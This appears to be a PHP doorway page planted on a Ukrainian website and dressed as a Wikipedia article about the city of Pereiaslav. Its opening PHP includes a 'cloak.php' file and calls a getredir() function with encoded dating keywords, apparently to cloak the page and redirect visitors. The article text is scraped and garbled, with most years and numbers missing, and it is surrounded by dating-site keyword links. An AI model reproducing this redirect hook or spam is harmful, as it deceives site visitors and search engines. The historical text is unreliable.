<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bc%d0%be%d1%97+%d1%88%d0%b2%d0%b8%d0%b4%d0%ba%d1%96%d1%81%d0%bd%d1%96+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b2+%d0%9f%d0%b5%d1%80%d0%b5%d1%8f%d1%81%d0%bb%d0%b0%d0%b2+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Переяслав — Вікіпедія</title>
	<meta name="description" content="І якщо твій муж ударить моїм, то не будем воювати три роки, якщо ж наш муж Переяславський полк був одним з найбільших в Україні ( року." />
	<link rel="canonical" href="https://masage.od.ua/img/103/xul-mo-shvidksn.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/113/pisap-znayomstva-z.php">знайомства з хлопцями з Умань Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/422/baqyv-zhnki-sho.php">жінки, що знайомства поблизу Рахів Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/418/fowyl-naykrashiy-trener-znayomstv.php">найкращий тренер знайомств у Рівне Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/py-shvidksn-znayomstva.php">швидкісні знайомства поблизу в Добропілля Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Мої швидкісні знайомства в Переяслав Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Колишнє удільне переяславське князівство перестало існувати, а його землі разом зі столицею включили в нову адміністративну одиницю — Сарайську тьму.</p><strong><a id='d1'></a><h2>Переяслав-Хмельницький державний педагогічний університет імені Григорія Сковороди</h2></strong><p>Приблизно тоді ж кафедру переяславської єпархії перенесли до ставки хана в Сарай-Берке. Її очільником став призначений митрополитом Кирилом єпископ Феогност [11]. Відтоді місто, хоч і частково заселене, повністю занепадає. Відродження Переяслава формально розпочалось 6 березня  р. За цією грамотою князь мав право «вь томъ то Переяславлю замокъ збудовати». Відновлене місто отримало магдебурзьке право і власний герб, підтверджені потім грамотою Сигізмунда III в  р.</p><a id='d2'></a><h3>"Сиди й не ворушися!"</h3><p>Іншим листом під  р. Серед інших визначних моментів річпосполитської частини історії міста була фундація старостою Лукашем Жолкевським помер  р. Після створення Богданом Хмельницьким у повсталій проти поляків Україні полкового устрою влітку року Переяслав став центром округи — однойменного полку втім, як окрема одиниця Переяславський козацький полк існував ще з часів гетьмана Марка Жмайла.</p>
		
			<br><ol>
			
				<li>Навігаційне меню!</li>
			
				<li>сайти знайомств у місті Славута Україна.</li>
			
				<li>Баришівка та Переяслав від alyona alyona.</li>
			
				<li>латинські швидкісні знайомства в Краматорськ Україна;</li>
			
				<li>Мрії, що народжуюся з дитинства.</li>
			
				<li>Підписатись на новини?</li>
			
				<li>сайти старших знайомств Новодністровськ Україна.</li>
			
			</ol>
		
	<p>Переяславський полк був одним з найбільших в Україні року налічував 18 сотень. Переяслав залишався полковим містом до  р. Під час козацької війни Переяслав був важливим центром постачання зброї і харчів для війська. У цей час він відіграє роль дипломатичного центру держави. Сюди приїздили польські, московські, угорські, татарські, османські посли. Війна з Річчю Посполитою обіцяла бути довгою й кровопролитною, татари й османи не були надійними союзниками, тому гетьман неодноразово звертався до московського уряду із пропозицією про військовий союз України з Московським царством.</p>
<p>У жовтні  р. Земський собор у Москві нарешті ухвалив рішення про альянс. До Переяслава 31 грудня року прибуло посольство від московського царя Алєксєя Міхайловіча на чолі з боярином Василем Бутурліним.</p><img src="https://i.ytimg.com/vi/JodAcU6tPHo/maxresdefault.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Згоди домоглися після бурхливої дискусії й взаємних компромісів. Основним змістом угоди, оформленої у вигляді чолобитної на ім'я царя, було те, що Україна прийняла протекторат московського самодержця, зберігаючи повну як у внутрішніх, так і в зовнішніх справах автономію, свій республіканський лад і особливий козацький устрій. Україна мала право підтримувати дипломатичні відносини з іншими державами, за винятком Речі Посполитої й Османською імперії.</p>
<p>Зранку 8 січня старшинська рада прийняла уточнення умов угоди. У другій половині дня скликали загальну раду на центральній площі. Зібралася майже вся козацька старшина, керівники полків, по 5—7 козаків з кожного полку, духівництво, міщани тощо. Переяславський полк був у повному складі. По закінченні ради гетьман, полковники та старшина вирушили до Успенської церкви, де в присутності послів і московських священиків склали присягу московському царю.</p>
		
			<br><ol>
			
				<li>російські знайомства Костопіль Україна.</li>
			
				<li>ДЕМОКРАТИЧНА УКРАЇНА;</li>
			
				<li>Молода пара подорожувала Україною мотоциклом. За 21 день проїхали чотири тисячі кілометрів.</li>
			
				<li>сайти знайомств з людьми в Рені Україна;</li>
			
				<li>регіон знайомств Перевальськ Україна;</li>
			
				<li>регіон знайомств Перевальськ Україна.</li>
			
				<li>безкоштовні сайти підключення поблизу Ватутіне Україна.</li>
			
			</ol>
		
	<p>До всіх міст і полків України вирушили московські посланці для складання присяги на місцях, але не скрізь їх радо зустрічали. Наприклад, київське духовенство не склало присяги і взагалі неприязно сприйняло це єднання. Також не склали присяги полковники Іван Богун і Мартин Пушкар. Після смерті Богдана Хмельницького між представниками старшини почались чвари та боротьба за владу.</p>
<p>Значну територію України охопили народні повстання. У липні року повстання спалахнуло в Переяславському полку. Проте місто розвивалося. У Переяславі функціонували 2 школи — при Успенській та Покровській церквах. Великого розмаху набуло будівництво, здебільшого дерев'яне.</p>
<p>Відбудували Михайлівську церкву, зруйновану татарами. Коштом гетьмана Івана Мазепи звели головний собор Вознесенського монастиря. Після ліквідації на Лівобережній Україні полкового устрою року Переяслав став повітовим містом Київського намісництва , а від початку XIX ст. Місто зростало. Так, року кількість населення становила жителів, року — вже 10  осіб.</p>
<p>У поміщицьких господарствах Переяславщини розвивалися цукроваріння , винокуріння , виробництво зернових. У самому Переяславі промисловість була розвинена мало. Крім землеробства, люди займалися кустарними промислами: ткацтвом , чинбарством , шевством. Наприкінці XIX ст.</p><strong><a id='d3'></a><h2>Університет Григорія Сковороди в Переяславі • ПХДПУ</h2></strong><p>Значну частину культурних пам'яток Переяслава знищили під час атеїстичної боротьби х рр. Під час Голодомору — в місті й районі загинуло 26  осіб. Ще життів переяславців забрала війна.</p>
		
			
				<div>Переяслав-Хмельницький Державний педагогічний університет імені Григорія Сковороди - Бери вище!</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/NFyPYdraIjU' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Незважаючи на тисячолітню історію, 12 жовтня року, відразу після повернення радянської влади, указом Президії Верховної Ради СРСР місто перейменували в Переяслав-Хмельницький. Науковці тривалий час дискутували про доцільність повернення історичної назви. Нарешті, 26 жовтня року, депутати міської ради Переяслав-Хмельницького підтримали рішення про повернення місту історичної назви.</p>
<p>За Переяслав проголосували 22 депутати з 35 , 2 — були проти, 2 — утрималися, 2 не голосували, 7 відсутніх. Цю ідею міська влада мала намір реалізувати шляхом референдуму ще у році, однак тоді проєкт заблокували представники комуністів [13]. З року Переяслав-Хмельницький — місто обласного значення. За тодішнім звичаєм, «за успіхи в соціально-економічному та культурному розвитку» року уряд СРСР нагородив місто Орденом Дружби народів.</p>
<p>Того ж року відродили давній герб Переяслава і затвердили його прапор. Створений року — спершу як Переяслав-Хмельницький філіал Київського державного педагогічного інституту — ПХДПУ продовжив стародавні переяславські освітні традиції. Драгоманова був створений Переяслав-Хмельницький державний педагогічний інститут, якому в році присвоєно ім'я Г. City  — міське інтернет-видання, запущене у серпні року колективом газети «Вісник Переяславщини» та Агенцією розвитку локальних медіа «Або». У місті стараннями першого очільника відновленого переяславського музею Михайла Сікорського створили Національний історико-етнографічний заповідник , який складається з 25 музеїв, а фондова колекція нараховує тисяч експонатів:.</p>
<p>З Переяславом пов'язано багато уславлених імен — серед них політичні діячі, письменники, композитори, історики, художники, педагоги. Матеріал з Вікіпедії — вільної енциклопедії. Стабільна версія була перевірена 26 січня  Переяслав адміністративно-територіальна одиниця Герб Переяслава Прапор Переяслава За годинниковою стрілкою зверху: Центральна площа міста — майдан Богдана Хмельницького, жовтень року, Пам'ятник на честь першої літописної згадки про Україну, Пам'ятник давньоруському співцю Бояну, Окольний град літописного міста Переяслав, Пам'ятний знак на честь автора поеми Слово о полку Ігоревім, Залишки Воскресенської церкви, Вознесенський монастир.</p>
		
	<p>У Вікіпедії є статті про інші значення цього терміна: Переяслав значення. Докладніше: Середньовічний Переяславль та Переяславське князівство. Докладніше: Переяславський полк та Переяславська рада. Докладніше: Церкви Переяслава. Докладніше: Пам'ятники Переяслава. Пам'ятний знак на честь річчя літописної згадки про Переяслав  Нарис історії української лексикографії.</p>
<p>І , — С. Український тиждень. Процитовано 27 жовтня  Процитовано 29 жовтня  Лівий берег.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/211/toki-znayomstva-dvchat-nomer.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/133/wehym-ostrv-saytv-znayomstv.php">острів сайтів знайомств поблизу Камянське Україна</a></li><li><a href="https://masage.od.ua/img/196/sokuz-naykrashiy-trener-znayomstv.php">найкращий тренер знайомств Соснівка Україна</a></li><li><a href="https://masage.od.ua/img/494/kazy-znayomstva-bezkoshtovnih-saytv.php">знайомства безкоштовних сайтів Чортків Україна</a></li><li><a href="https://masage.od.ua/img/266/judu-tsentralne-shvidksne-znayomstvo.php">центральне швидкісне знайомство Ніжин Україна</a></li><li><a href="https://masage.od.ua/img/291/fygil-klubi-pdklyuchennya.php">клуби підключення в Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#d1'>Переяслав-Хмельницький державний педагогічний університет імені Григорія Сковороди</a></li>
<li><a href='#d2'>"Сиди й не ворушися!"</a></li>
<li><a href='#d3'>Університет Григорія Сковороди в Переяславі • ПХДПУ</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/248/qoqej-pyatnitsya-ogoloshennya-znayomstva.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>